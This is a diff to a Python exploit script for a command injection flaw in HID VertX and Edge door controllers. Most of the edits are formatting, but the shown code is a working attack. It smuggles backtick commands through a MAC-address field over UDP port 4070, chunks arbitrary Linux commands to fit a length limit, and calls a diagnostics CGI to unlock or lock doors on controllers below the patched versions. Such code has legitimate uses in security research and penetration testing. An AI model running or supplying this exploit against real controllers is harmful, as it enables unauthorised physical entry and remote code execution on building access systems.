@@ -8,8 +8,8 @@
 # copies of the Software, and to permit persons to whom the Software is
 # furnished to do so, subject to the following conditions:
 #
-# The above copyright notice and this permission notice shall be included in all
-# copies or substantial portions of the Software.
+# The above copyright notice and this permission notice shall be included in
+# all copies or substantial portions of the Software.
 #
 # THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 # IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
@@ -22,12 +22,13 @@ import argparse
 import time
 from socket import *
 
+
 def main():
 	parser = argparse.ArgumentParser(description='Command Injection on HID VertX and Edge Door Controllers')
 	parser.add_argument('-i', '--ip', help='IP address of VertX controller, (default 255.255.255.255)', default='255.255.255.255', required=False)
 	parser.add_argument('-p', '--port', help='Port of VertX controller, (default 4070)', default=4070, type=int, required=False)
 	parser.add_argument('--action', help='Unlock or lock or doors', choices=['unlock', 'lock'], default=None, required=False)
-	parser.add_argument('--raw', help='Raw Linux command as payload (hint: ping -c 5 IP_ADDRESS)', action='store_true', required=False)
+	parser.add_argument('--raw', help='Raw Linux command as payload (example: ping -c 5 IP_ADDRESS)', action='store_true', required=False)
 	args = parser.parse_args()
 
 	s = socket(AF_INET, SOCK_DGRAM)
@@ -48,7 +49,8 @@ def main():
 
 		# Unlock doors
 		elif args.action == 'unlock':
-			commands = ["export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(board),
+			commands = [
+				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=1\"".format(board),
 				'/mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
 				'chmod -x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi'
 			]
@@ -58,7 +60,8 @@ def main():
 
 		# Lock doors
 		elif args.action == 'lock':
-			commands = ['chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
+			commands = [
+				'chmod +x /mnt/apps/web/cgi-bin/diagnostics_execute.cgi',
 				"export QUERY_STRING=\"?ID=0&BoardType={0}&Description=Strike&Relay=1&Action=0\"".format(board),
 				"/mnt/apps/web/cgi-bin/diagnostics_execute.cgi"
 			]
@@ -66,7 +69,8 @@ def main():
 			print_status('Locking doors...')
 			upload_script(s, commands, mac_address, args.ip, args.port)
 
-	s.close()			
+	s.close()
+
 
 # Get information about VertX controller
 def fingerprint_controller(data):
@@ -82,15 +86,16 @@ def fingerprint_controller(data):
 
 	return response_data[2], response_data[6]
 
-# Check of VertX/Edge controller is vulnerable
+
+# Check of VertX controller is vulnerable
 def check_version(version):
 	vulnerable = False
 
-	# Legacy VertX/Edge controllers patched with 2.2.7.568
+	# Legacy VertX controllers patched with 2.2.7.568
 	if int(version[0]) == 2 and int(version.replace('.', '')) < 227568:
 		vulnerable = True
 
-	# EVO VertX/Edge controllers patched with 3.5.1.1483
+	# EVO VertX controllers patched with 3.5.1.1483
 	elif int(version[0]) == 3 and int(version.replace('.', '')) < 3511483:
 		vulnerable = True
 
@@ -98,6 +103,7 @@ def check_version(version):
 		vulnerable = None
 
 	return vulnerable
+
 
 # Upload script
 def upload_script(s, commands, mac, ip, port):
@@ -136,6 +142,7 @@ def upload_script(s, commands, mac, ip, port):
 	payload = "{0};1`rm /tmp/b`;".format(mac)
 	send_command(s, command, payload, ip, port)
 
+
 # Trigger command injection
 def send_command(s, command, payload, ip, port):
 	if len(payload) == 0:
@@ -160,19 +167,24 @@ def send_command(s, command, payload, ip, port):
 	except Exception, error:
 		print_error('VertX controller did not send a response!')
 
+
 # Split command because of 22 character length limit
 def chunk_string(command, length):
 	return (command[0 + i:length + i] for i in range(0, len(command), length))
 
+
 def print_error(msg):
 	print "\033[1m\033[31m[-]\033[0m {0}".format(msg)
-	
+
+
 def print_status(msg):
 	print "\033[1m\033[34m[*]\033[0m {0}".format(msg)
-		
+
+
 def print_good(msg):
 	print "\033[1m\033[32m[+]\033[0m {0}".format(msg)
-	
+
+
 def print_warn(msg):
 	print "\033[1m\033[33m[!]\033[0m {0}".format(msg)
 
